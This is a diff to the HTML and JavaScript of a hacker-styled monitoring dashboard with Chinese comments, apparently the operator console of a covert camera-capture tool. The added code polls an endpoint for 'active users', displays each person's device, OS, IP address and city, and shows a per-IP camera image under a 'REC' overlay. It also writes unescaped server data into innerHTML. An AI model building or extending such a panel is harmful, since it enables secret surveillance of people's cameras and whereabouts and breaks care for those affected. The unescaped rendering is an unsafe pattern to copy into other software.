@@ -289,24 +289,28 @@
             </div>
         </div>
 
+        <!-- 添加用户列表面板 -->
+        <div class="data-card rounded-lg p-4 mb-6">
+            <h2 class="text-xl mb-4 flex items-center">
+                <span class="status-indicator"></span>
+                ACTIVE::USERS
+                <span class="keyboard-shortcut">[ALT+U]</span>
+            </h2>
+            <div id="active-users" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                <!-- 用户卡片将在这里动态生成 -->
+            </div>
+        </div>
+
         <!-- 数据网格 -->
         <div class="data-grid">
-            <!-- 摄像头模块 -->
             <div class="data-card rounded-lg p-4">
                 <h3 class="text-lg mb-3 flex items-center">
                     <span class="status-indicator"></span>
-                    CAMERA::FEED
+                    CAMERA::FEEDS
                     <span class="keyboard-shortcut">[ALT+1]</span>
                 </h3>
-                <div class="camera-feed">
-                    <div class="camera-overlay">
-                        <span id="camera-status" class="glitch-text">● REC</span>
-                        <span id="camera-time">00:00:00</span>
-                    </div>
-                    <img id="camera-output" src="" alt="Camera Feed">
-                </div>
-                <div class="chart-container">
-                    <canvas id="camera-activity-chart"></canvas>
+                <div id="camera-feeds" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <!-- 摄像头feeds将在这里动态生成 -->
                 </div>
             </div>
 
@@ -613,6 +617,133 @@
             const seconds = (uptime % 60).toString().padStart(2, '0');
             document.getElementById('system-uptime').textContent = `${hours}:${minutes}:${seconds}`;
         }, 1000);
+
+        // 添加用户管理类
+        class UserManager {
+            constructor() {
+                this.users = new Map();
+                this.selectedUser = null;
+                this.updateInterval = 5000; // 5秒更新一次
+                this.initialize();
+            }
+
+            async initialize() {
+                await this.updateActiveUsers();
+                setInterval(() => this.updateActiveUsers(), this.updateInterval);
+            }
+
+            async updateActiveUsers() {
+                try {
+                    const response = await fetch('/api/active-users');
+                    if (!response.ok) throw new Error('Failed to fetch active users');
+                    
+                    const users = await response.json();
+                    this.users.clear();
+                    
+                    users.forEach(user => {
+                        this.users.set(user.ip, user);
+                    });
+                    
+                    this.renderUserList();
+                    this.updateCameraFeeds();
+                } catch (error) {
+                    console.error('Error updating active users:', error);
+                }
+            }
+
+            renderUserList() {
+                const container = document.getElementById('active-users');
+                container.innerHTML = '';
+
+                this.users.forEach((user, ip) => {
+                    const userCard = document.createElement('div');
+                    userCard.className = 'data-card p-3 cursor-pointer hover:border-green-400 transition-all';
+                    userCard.innerHTML = `
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center">
+                                <span class="status-indicator"></span>
+                                <span class="font-mono">${user.device.model}</span>
+                            </div>
+                            <span class="text-sm opacity-70">${this.timeAgo(user.lastSeen)}</span>
+                        </div>
+                        <div class="mt-2 text-sm">
+                            <div>OS: ${user.device.os}</div>
+                            <div>IP: ${user.ip}</div>
+                            <div>Location: ${user.location.city}, ${user.location.country}</div>
+                        </div>
+                    `;
+                    
+                    userCard.onclick = () => this.selectUser(ip);
+                    container.appendChild(userCard);
+                });
+            }
+
+            updateCameraFeeds() {
+                const container = document.getElementById('camera-feeds');
+                container.innerHTML = '';
+
+                this.users.forEach((user, ip) => {
+                    const feedContainer = document.createElement('div');
+                    feedContainer.className = 'camera-feed-container';
+                    feedContainer.innerHTML = `
+                        <div class="camera-feed relative">
+                            <div class="camera-overlay">
+                                <span class="glitch-text">● REC</span>
+                                <span>${user.device.model}</span>
+                            </div>
+                            <img src="/api/camera-image/${ip}?t=${Date.now()}" 
+                                 alt="Camera Feed" 
+                                 onerror="this.src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII='"
+                                 class="w-full h-full object-cover">
+                        </div>
+                    `;
+                    container.appendChild(feedContainer);
+                });
+            }
+
+            selectUser(ip) {
+                this.selectedUser = ip;
+                // 高亮选中的用户卡片
+                document.querySelectorAll('#active-users .data-card').forEach(card => {
+                    card.classList.toggle('border-green-400', card.querySelector(`[data-ip="${ip}"]`));
+                });
+            }
+
+            timeAgo(timestamp) {
+                const now = new Date();
+                const past = new Date(timestamp);
+                const diff = now - past;
+                
+                if (diff < 60000) return 'just now';
+                if (diff < 3600000) return `${Math.floor(diff/60000)}m ago`;
+                if (diff < 86400000) return `${Math.floor(diff/3600000)}h ago`;
+                return `${Math.floor(diff/86400000)}d ago`;
+            }
+        }
+
+        // 初始化用户管理器
+        const userManager = new UserManager();
+
+        // 更新系统状态显示
+        function updateSystemStatus() {
+            const activeCount = userManager.users.size;
+            document.getElementById('active-connections').textContent = `CONN::${activeCount}`;
+        }
+
+        // 定期更新系统状态
+        setInterval(updateSystemStatus, 5000);
+
+        // 添加键盘快捷键支持
+        document.addEventListener('keydown', (e) => {
+            if (e.altKey) {
+                switch(e.key) {
+                    case 'u':
+                        document.getElementById('active-users').scrollIntoView({ behavior: 'smooth' });
+                        break;
+                    // ... 其他快捷键 ...
+                }
+            }
+        });
     </script>
 </body>
 </html> 
